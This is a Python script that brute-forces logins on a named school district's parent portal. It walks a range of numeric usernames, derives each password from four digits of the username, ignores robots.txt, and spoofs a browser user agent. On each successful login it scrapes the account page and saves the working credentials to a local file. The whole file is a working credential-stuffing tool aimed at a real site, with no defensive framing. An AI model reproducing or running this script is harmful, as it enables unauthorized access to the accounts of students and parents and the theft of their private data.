import mechanize
from bs4 import BeautifulSoup

br = mechanize.Browser()
br.set_handle_equiv(True)
br.set_handle_redirect(True)
br.set_handle_referer(True)
br.set_handle_robots(False)

# Set defaults
br.addheaders = [
    ("User-agent", "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.13) Gecko/20101206 Ubuntu/10.10 (maverick) Firefox/3.6.13")]


def downwithit(string, firstHalf, secondHalf):
    string = str(string)
    format1 = string.replace(str(firstHalf), "")
    format2 = format1.replace(str(secondHalf), "")
    return format2


for x in range(4620000000, 4699999999):
    br.open("https://dashboard.okaloosaschools.com/parentportal/PP000.pgm")
    br.select_form(nr=0)
    username = str(x)
    userpass = username[6] + username[7] + username[8] + username[9]
    # Set bruteforce combo
    br.form['wrkuser'] = username
    br.form['wrkpasswd'] = userpass
    print("Checking " + br.form['wrkuser'] + " " + br.form['wrkpasswd'])
    response = br.submit()
    try:
        # Try to select form, if missing then combo was found
        br.select_form(nr=0)
    except mechanize._mechanize.FormNotFoundError:
        # Notify there was a match
        print("=== MATCH === \nUsername: " + username
              + "\nPassword: " + userpass + "\n=== ===== ===")

        # Retrieve redirect url embedded in js code
        firstFormat = BeautifulSoup(br.response().read(), 'lxml')
        formatted = str(firstFormat)
        newUrl = downwithit(
            formatted, "<html><head></head><body nosplash=\"\" onload=\"location.replace('", "');\"></body></html>")
        br.open("https://dashboard.okaloosaschools.com" + newUrl)

        # Scrape and format web data
        secondFormat = BeautifulSoup(br.response().read(), 'lxml')
        body_tag = secondFormat.body
        spanables = secondFormat.find_all('span')

        # Clean up the scraped combo
        userDirty = downwithit(spanables, "<span style=\" font-size: 15px; font-family: 'Courier New', 'Courier', monospace;\">",
                               "</span>, <span style=\" font-size: 15px; font-family: 'Courier New', 'Courier', monospace;\">")
        userClean = downwithit(userDirty, "</span>", "</span>")
        userCombo = downwithit(userClean, "[", "]")

        # Write to file
        f = open("./assets/matches.txt", "a")
        f.write("Combo: " + str(userCombo) + "\nUsername: "
                + username + "\nPassword: " + userpass + "\n\n")
        f.close()

        # Reset web browser to counteract a FormNotFoundError
        br.open("https://dashboard.okaloosaschools.com/parentportal/PP000.pgm")
        pass
